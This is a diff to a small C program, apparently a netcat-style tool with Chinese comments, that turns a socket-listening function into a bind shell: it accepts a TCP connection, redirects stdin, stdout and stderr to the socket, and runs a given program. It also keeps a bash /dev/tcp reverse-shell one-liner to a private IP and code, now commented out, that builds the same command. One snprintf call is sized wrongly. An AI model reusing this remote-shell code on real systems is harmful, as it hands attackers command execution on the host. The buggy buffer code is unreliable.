@@ -16,7 +16,6 @@ typedef struct for_std  // 结构体，用于保存线程信息，方便通知�
 
 void nf_exec_serv(char * ip, int port_start, char * filename)
 {
-    /*
     int serv_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	struct sockaddr_in serv_addr;
     memset(&serv_addr, 0, sizeof(serv_addr));  //每个字节都用0填充
@@ -26,14 +25,20 @@ void nf_exec_serv(char * ip, int port_start, char * filename)
     bind(serv_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
 
 	//进入监听状态，等待用户发起请求
-    char cmd[1024] = {0};
-    sprintf(cmd, "%s 1>0", filename);
-    system(cmd);
     listen(serv_sock, 20);
 	struct sockaddr_in clnt_addr;
     socklen_t clnt_addr_size = sizeof(clnt_addr);
     int clnt_sock = accept(serv_sock, (struct sockaddr*)&clnt_addr, &clnt_addr_size);
-	for_std local, remote;
+	dup2(clnt_sock, 0);
+    dup2(clnt_sock, 1);
+    dup2(clnt_sock, 2);
+
+    //cout << filename << endl;
+    //execve(filename, NULL, NULL);
+    system(filename);
+
+    /*
+    for_std local, remote;
     
     // 由于两个线程都对同一个套接字进行操作，因此local.clnt_sock_ptr与remote.clnt_sock_ptr一样
 	local.clnt_sock_ptr = &clnt_sock;
@@ -54,14 +59,15 @@ void nf_exec_serv(char * ip, int port_start, char * filename)
     // 关闭套接字，释放系统资源
 	close(serv_sock);
 	close(clnt_sock);
-    */
     //bash -i >& /dev/tcp/192.168.146.129/2333 <&2
+    /*
     char cmd[1024] = {0};
     char port[6] = {0};
     //itoa(port_start, port, 10);
     snprintf(port, sizeof(cmd), "%d", port_start);
     sprintf(cmd, "%s -i >& /dev/tcp/%s/%s <&2", filename, ip, port);
     system(cmd);
+    */
 	return;
 }
 
